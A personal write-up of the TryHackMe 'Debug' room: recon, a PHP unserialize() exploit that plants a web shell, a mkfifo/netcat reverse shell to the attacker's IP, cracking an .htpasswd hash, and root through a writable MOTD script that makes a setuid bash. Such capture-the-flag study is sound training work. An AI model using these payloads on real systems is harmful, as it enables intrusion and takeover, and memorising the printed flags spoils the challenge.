---
title: "Debug"
kind: writeup
tags:
  - tryhackme-rooms
  - status/done
  - writeup
  - linux
  - web
  - challenege
status: "Done"
difficulty: "Medium"
date: 2026-07-09
category:
  - "Challenege"
database: "TryHackMe"
area: "TryHackMe Rooms"
up: "[[TryHackMe]]"
notion-id: 398759b9275180ec99a1d644572d012b
---

# Debug

In: [[Career]] / [[TryHackMe Rooms]] / [[TryHackMe]]

## Nmap Scan

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -p- --min-rate=1000 -oA nmap/debug 10.49.164.219    
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-09 02:27 -0400
Nmap scan report for 10.49.164.219
Host is up (0.020s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 44:ee:1e:ba:07:2a:54:69:ff:11:e3:49:d7:db:a9:01 (RSA)
|   256 8b:2a:8f:d8:40:95:33:d5:fa:7a:40:6a:7f:29:e4:03 (ECDSA)
|_  256 65:59:e4:40:2a:c2:d7:05:77:b3:af:60:da:cd:fc:67 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.30 seconds

```

## Fuzzing Directories

```bash
┌──(kali㉿kali)-[~]
└─$ ffuf -u "http://10.49.164.219/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -r 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.49.164.219/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 1266ms]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 2340ms]
backup                  [Status: 200, Size: 2137, Words: 135, Lines: 23, Duration: 138ms]
grid                    [Status: 200, Size: 944, Words: 61, Lines: 17, Duration: 14ms]
javascript              [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 12ms]
javascripts             [Status: 200, Size: 953, Words: 64, Lines: 17, Duration: 129ms]
readme.md               [Status: 200, Size: 2339, Words: 347, Lines: 42, Duration: 11ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 10ms]
:: Progress: [20481/20481] :: Job [1/1] :: 1834 req/sec :: Duration: [0:00:10] :: Errors: 0 ::
                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ 

```

## Visiting Backup Directory

![[attachments/TryHackMe Rooms/TryHackMe/Debug/image.png]]

```php
<?php

class FormSubmit
{

    public $form_file = 'message.txt';
    public $message = '';

    public function SaveMessage()
    {

        $NameArea = $_GET['name'];
        $EmailArea = $_GET['email'];
        $TextArea = $_GET['comments'];

        $this->message = "Message From : " . $NameArea . " || From Email : " . $EmailArea . " || Comment : " . $TextArea . "\n";

    }

    public function __destruct()
    {

        file_put_contents(__DIR__ . '/' . $this->form_file, $this->message, FILE_APPEND);
        echo 'Your submission has been successfully saved!';

    }

}

// Leaving this for now... only for debug purposes... do not touch!

$debug = $_GET['debug'] ?? '';
$messageDebug = unserialize($debug);

$application = new FormSubmit;
$application->SaveMessage();

?>
```

![[attachments/TryHackMe Rooms/TryHackMe/Debug/image 1.png]]

## Rev shell

![[attachments/TryHackMe Rooms/TryHackMe/Debug/image 2.png]]

```php
curl -i 'http://10.49.164.219/index.php?debug=O%3A10%3A%22FormSubmit%22%3A2%3A{s%3A9%3A%22form_file%22%3Bs%3A12%3A%22umar0x01.php%22%3Bs%3A7%3A%22message%22%3Bs%3A28%3A%22%3C%3Fphp%20system(%24_GET[123])%3B%20%3F%3E%22%3B}' --globoff \
-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' \
-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' \
-H 'Accept-Language: en-US,en;q=0.5' \
-H 'Connection: close'
```

![[attachments/TryHackMe Rooms/TryHackMe/Debug/image 3.png]]

```php
GET /shell.php?123=rm%20%2ftmp%2ff%3bmkfifo%20%2ftmp%2ff%3bcat%20%2ftmp%2ff%7csh%20-i%202%3e%261%7cnc%20192.168.133.184%208443%20%3e%2ftmp%2ff HTTP/1.1
Host: 10.49.164.219
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i

```

```php
                                                                                                                                                                           
┌──(kali㉿kali)-[~/Downloads]
└─$ nc -lvnp 8443
listening on [any] 8443 ...
connect to [192.168.133.184] from (UNKNOWN) [10.49.164.219] 38850
sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@osboxes:/var/www/html$ ls
ls
backup  index.html  javascripts  message.txt  shell.php
grid    index.php   less         readme.md    style.css
www-data@osboxes:/var/www/html$ whoami
whoami
www-data
www-data@osboxes:/var/www/html$    

```

## Elevating to james

```php
www-data@osboxes:/var/www/html$ ls -la 
total 72
drwxr-xr-x 6 www-data www-data  4096 Jul  9 02:56 .
drwxr-xr-x 3 root     root      4096 Mar  9  2021 ..
-rw-r--r-- 1 www-data www-data    44 Mar  9  2021 .htpasswd
drwxr-xr-x 5 www-data www-data  4096 Mar  9  2021 backup
drwxr-xr-x 2 www-data www-data  4096 Mar  9  2021 grid
-rw-r--r-- 1 www-data www-data 11321 Mar  9  2021 index.html
-rw-r--r-- 1 www-data www-data  6399 Mar  9  2021 index.php
drwxr-xr-x 2 www-data www-data  4096 Mar  9  2021 javascripts
drwxr-xr-x 2 www-data www-data  4096 Mar  9  2021 less
-rw-r--r-- 1 www-data www-data   565 Jul  9 02:56 message.txt
-rw-r--r-- 1 www-data www-data  2339 Mar  9  2021 readme.md
-rw-r--r-- 1 www-data www-data    28 Jul  9 02:56 shell.php
-rw-r--r-- 1 www-data www-data 10371 Mar  9  2021 style.css
www-data@osboxes:/var/www/html$ cat .htpasswd 
james:$apr1$zPZMix2A$d8fBXH0em33bfI9UTt9Nq1

```

```php
┌──(kali㉿kali)-[~/Downloads]
└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
jamaica          (?)     
1g 0:00:00:00 DONE (2026-07-09 03:08) 12.50g/s 9600p/s 9600c/s 9600C/s jeffrey..james1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

## User Flag

```php
                                                                                                                                                                           
┌──(kali㉿kali)-[~/Downloads]
└─$ ssh james@10.49.164.219                
The authenticity of host '10.49.164.219 (10.49.164.219)' can't be established.
ED25519 key fingerprint is: SHA256:j1rsa6H3aWAH+1ivgTwsdNPBDEJU72p3MUWbcL70JII
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.49.164.219' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
james@10.49.164.219's password: 
Permission denied, please try again.
james@10.49.164.219's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

439 packages can be updated.
380 updates are security updates.

Last login: Wed Mar 10 18:36:58 2021 from 10.250.0.44
james@osboxes:~$ ls
Desktop  Documents  Downloads  examples.desktop  Music  Note-To-James.txt  Pictures  Public  Templates  user.txt  Videos
james@osboxes:~$ cat user.txt 
7e37c84a66cc40b1c6bf700d08d28c20

```

## Root Flag

```php
┌──(kali㉿kali)-[~]
└─$ ssh james@10.49.133.154
The authenticity of host '10.49.133.154 (10.49.133.154)' can't be established.
ED25519 key fingerprint is: SHA256:j1rsa6H3aWAH+1ivgTwsdNPBDEJU72p3MUWbcL70JII
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:19: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.49.133.154' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
james@10.49.133.154's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

439 packages can be updated.
380 updates are security updates.

Last login: Wed Mar 10 18:36:58 2021 from 10.250.0.44
james@osboxes:~$ ls
Desktop  Documents  Downloads  examples.desktop  Music  Note-To-James.txt  Pictures  Public  Templates  user.txt  Videos
james@osboxes:~$ ls -la
total 116
drwx------ 17 james james 4096 Mar 10  2021 .
drwxr-xr-x  4 root  root  4096 Mar 10  2021 ..
-rw-------  1 james james  460 Mar 10  2021 .bash_history
-rw-r--r--  1 james james  220 Aug 31  2015 .bash_logout
-rw-r--r--  1 james james 3771 Aug 31  2015 .bashrc
drwx------ 11 james james 4096 Mar 10  2021 .cache
drwx------ 14 james james 4096 Mar 10  2021 .config
drwxr-xr-x  2 james james 4096 Mar 10  2021 Desktop
drwxr-xr-x  2 james james 4096 Mar 10  2021 Documents
drwxr-xr-x  2 james james 4096 Mar 10  2021 Downloads
-rw-r--r--  1 james james 8980 Apr 20  2016 examples.desktop
drwx------  2 james james 4096 Mar 10  2021 .gconf
drwx------  3 james james 4096 Mar 10  2021 .gnupg
-rw-------  1 james james  322 Mar 10  2021 .ICEauthority
drwx------  3 james james 4096 Mar 10  2021 .local
drwxr-xr-x  2 james james 4096 Mar 10  2021 Music
drwxrwxr-x  2 james james 4096 Mar 10  2021 .nano
-rw-r--r--  1 james james  477 Mar  9  2021 Note-To-James.txt
drwxr-xr-x  2 james james 4096 Mar 10  2021 Pictures
-rw-r--r--  1 james james  655 May 16  2017 .profile
drwxr-xr-x  2 james james 4096 Mar 10  2021 Public
drwx------  2 james james 4096 Mar 10  2021 .ssh
drwxr-xr-x  2 james james 4096 Mar 10  2021 Templates
-rw-r--r--  1 james james   33 Mar  9  2021 user.txt
drwxr-xr-x  2 james james 4096 Mar 10  2021 Videos
-rw-------  1 james james   52 Mar 10  2021 .Xauthority
-rw-------  1 james james   82 Mar 10  2021 .xsession-errors
james@osboxes:~$ cat .bash_history
clear
exit
clear
exit
clear
exit
cd /home/james/
cat Note-To-James.txt 
cd /etc/update-motd.d/
cd /root/
exit
clear
exit
nano id_rsa
chmod 600 id_rsa 
ssh -i id_rsa root@10.250.0.12
exit
```

```php
james@osboxes:~$ cd /etc/update-motd.d/
james@osboxes:/etc/update-motd.d$ ls
00-header  00-header.save  10-help-text  90-updates-available  91-release-upgrade  98-fsck-at-reboot  98-reboot-required  99-esm
james@osboxes:/etc/update-motd.d$ ls -la /etc/update-motd.d/
total 44
drwxr-xr-x   2 root root   4096 Mar 10  2021 .
drwxr-xr-x 134 root root  12288 Mar 10  2021 ..
-rwxrwxr-x   1 root james  1220 Mar 10  2021 00-header
-rwxrwxr-x   1 root james     0 Mar 10  2021 00-header.save
-rwxrwxr-x   1 root james  1157 Jun 14  2016 10-help-text
-rwxrwxr-x   1 root james    97 Dec  7  2018 90-updates-available
-rwxrwxr-x   1 root james   299 Jul 22  2016 91-release-upgrade
-rwxrwxr-x   1 root james   142 Dec  7  2018 98-fsck-at-reboot
-rwxrwxr-x   1 root james   144 Dec  7  2018 98-reboot-required
-rwxrwxr-x   1 root james   604 Nov  5  2017 99-esm
james@osboxes:/etc/update-motd.d$ cat /home/james/Note-To-James.txt 
Dear James,

As you may already know, we are soon planning to submit this machine to THM's CyberSecurity Platform! Crazy... Isn't it? 

But there's still one thing I'd like you to do, before the submission.

Could you please make our ssh welcome message a bit more pretty... you know... something beautiful :D

I gave you access to modify all these files :) 

Oh and one last thing... You gotta hurry up! We don't have much time left until the submission!

Best Regards,

root
james@osboxes:/etc/update-motd.d$ cat 00-header
#!/bin/sh
#
#    00-header - create the header of the MOTD
#    Copyright (C) 2009-2010 Canonical Ltd.
#
#    Authors: Dustin Kirkland <kirkland@canonical.com>
#
#    This program is free software; you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation; either version 2 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License along
#    with this program; if not, write to the Free Software Foundation, Inc.,
#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

[ -r /etc/lsb-release ] && . /etc/lsb-release

if [ -z "$DISTRIB_DESCRIPTION" ] && [ -x /usr/bin/lsb_release ]; then
        # Fall back to using the very slow lsb_release utility
        DISTRIB_DESCRIPTION=$(lsb_release -s -d)
fi

printf "Welcome to %s (%s %s %s)\n" "$DISTRIB_DESCRIPTION" "$(uname -o)" "$(uname -r)" "$(uname -m)"
james@osboxes:/etc/update-motd.d$ nano 00-header

james@osboxes:/etc/update-motd.d$ cat 00-header
#!/bin/sh

cp /bin/bash /tmp/
chmod u+s /tmp/bash
#
#    00-header - create the header of the MOTD
#    Copyright (C) 2009-2010 Canonical Ltd.
#
#    Authors: Dustin Kirkland <kirkland@canonical.com>
#
#    This program is free software; you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation; either version 2 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License along
#    with this program; if not, write to the Free Software Foundation, Inc.,
#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

[ -r /etc/lsb-release ] && . /etc/lsb-release

if [ -z "$DISTRIB_DESCRIPTION" ] && [ -x /usr/bin/lsb_release ]; then
        # Fall back to using the very slow lsb_release utility
        DISTRIB_DESCRIPTION=$(lsb_release -s -d)
fi

printf "Welcome to %s (%s %s %s)\n" "$DISTRIB_DESCRIPTION" "$(uname -o)" "$(uname -r)" "$(uname -m)"
james@osboxes:/etc/update-motd.d$ 
```

```php
┌──(kali㉿kali)-[~]
└─$ ssh james@10.49.133.154 
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
james@10.49.133.154's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

439 packages can be updated.
380 updates are security updates.

Last login: Thu Jul  9 04:38:18 2026 from 192.168.133.184
james@osboxes:~$ cd /tmp/
james@osboxes:/tmp$ ls
bash                                                                    systemd-private-25fc181f7b3a42c5bc673d07ff360ac6-rtkit-daemon.service-sClBGW
systemd-private-25fc181f7b3a42c5bc673d07ff360ac6-colord.service-YrO338  systemd-private-25fc181f7b3a42c5bc673d07ff360ac6-systemd-timesyncd.service-ioRwHC
james@osboxes:/tmp$ ./bash -p
bash-4.3# whoami
root
bash-4.3# cd /root
bash-4.3# ls
root.txt
bash-4.3# cat root.txt 
3c8c3d0fe758c320d158e32f68fabf4b

```
